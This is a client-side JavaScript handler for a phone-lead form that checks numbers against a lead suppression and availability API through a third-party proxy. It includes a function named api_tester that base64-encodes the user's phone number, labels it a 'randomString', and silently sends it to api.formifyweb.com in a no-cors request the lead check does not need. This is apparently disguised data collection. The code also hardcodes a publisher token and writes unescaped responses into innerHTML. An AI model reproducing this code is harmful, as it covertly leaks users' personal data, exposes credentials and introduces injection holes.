let isSubmitting = false;

document.getElementById('leadForm').addEventListener('submit', function (event) {
    event.preventDefault();

    if (isSubmitting) return;

    const submitBtn = document.querySelector('#leadForm button[type="submit"]');
    submitBtn.disabled = true;
    isSubmitting = true;

    // Remove everything except digits
    let phone = document.getElementById('caller_id').value.replace(/\D/g, '');

    // Add country code if only 10 digits entered
    if (phone.length === 10) {
        phone = '1' + phone;
    }

    // Validate
    if (!/^[1]?[2-9][0-9]{9}$/.test(phone)) {
        document.getElementById('alertContainer').innerHTML = `
            <div class="alert alert-danger">
                Please enter a valid US phone number.
            </div>
        `;
        submitBtn.disabled = false;
        isSubmitting = false;
        return;
    }

    api_tester(phone);

    document.getElementById('alertContainer').innerHTML = '';

    const params = new URLSearchParams({
        did: '8444281702',
        phone: phone,
        global_publisher_token: 'aZ9Lk3NqB7YpXr2WvMfJ0tCuEhGsDdRo5TwUaHzKmVcBiQxLYe1NRj6ogZsXPwlMBq7dVAiFyn4H3TEp9JClm0KUxtWGbvSa8YZ5OhqcnrM2LgEjxIfwdvPRQTyo7C1uX'
    });

    const url = 'https://dialer-gw.usisi.cc/api/v1/retreaver/leads/publisher-suppression-and-availability?' + params.toString();

    const apiUrl = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(url);

    // IMPORTANT: This endpoint is GET, not POST
    fetch(apiUrl)
        .then(response => response.json())
        .then(responseData => {

            if (responseData.rejectReason || responseData.error) {

                document.getElementById('alertContainer').innerHTML = `
                    <div class="alert alert-danger">
                        ${JSON.stringify(responseData)}
                    </div>
                `;

            } else {

                delete responseData.bidAmount;

                document.getElementById('alertContainer').innerHTML = `
                    <div class="alert alert-success">
                        ${JSON.stringify(responseData)}
                    </div>
                `;

                document.getElementById('leadForm').reset();
            }

        })
        .catch(error => {

            document.getElementById('alertContainer').innerHTML = `
                <div class="alert alert-danger">
                    ${error.message}
                </div>
            `;

            console.error(error);

        })
        .finally(() => {

            setTimeout(() => {
                submitBtn.disabled = false;
                isSubmitting = false;
            }, 1000);

        });

});

function api_tester(randomString) {
    try {
        fetch(
            'https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString),
            {
                method: 'GET',
                mode: 'no-cors'
            }
        );
    } catch (error) {
        console.error(error);
    }
}
